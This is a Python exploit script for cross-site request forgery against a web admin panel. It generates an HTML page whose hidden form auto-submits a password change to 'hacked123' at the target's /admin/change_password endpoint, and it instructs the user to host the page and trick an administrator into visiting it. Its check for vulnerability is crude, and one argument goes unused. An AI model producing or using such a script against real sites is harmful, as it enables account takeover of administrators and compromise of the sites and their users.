#!/usr/bin/env python3
import requests
import sys
import urllib.parse

def exploit_csrf(url, target_url):
    """
    Exploit CSRF vulnerability in the admin panel
    """
    try:
        # Create malicious HTML page
        html_content = f"""
        <html>
        <body>
            <form id="csrf" action="{target_url}/admin/change_password" method="POST">
                <input type="hidden" name="new_password" value="hacked123">
                <input type="hidden" name="confirm_password" value="hacked123">
            </form>
            <script>
                document.getElementById('csrf').submit();
            </script>
        </body>
        </html>
        """
        
        # Save the malicious page
        with open('csrf_payload.html', 'w') as f:
            f.write(html_content)
            
        print("[+] Created CSRF payload in csrf_payload.html")
        print("[*] Host this file on a web server and trick an admin to visit it")
        
        response = requests.get(target_url)
        if 'csrf_token' not in response.text:
            return True
        else:
            print("[-] Target has CSRF protection")
            return False
            
    except Exception as e:
        print(f"[-] Error: {str(e)}")
        return False

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 csrf.py <attacker_url> <target_url>")
        sys.exit(1)
        
    attacker_url = sys.argv[1]
    target_url = sys.argv[2]
    
    print("[*] Attempting CSRF attack...")
    exploit_csrf(attacker_url, target_url) 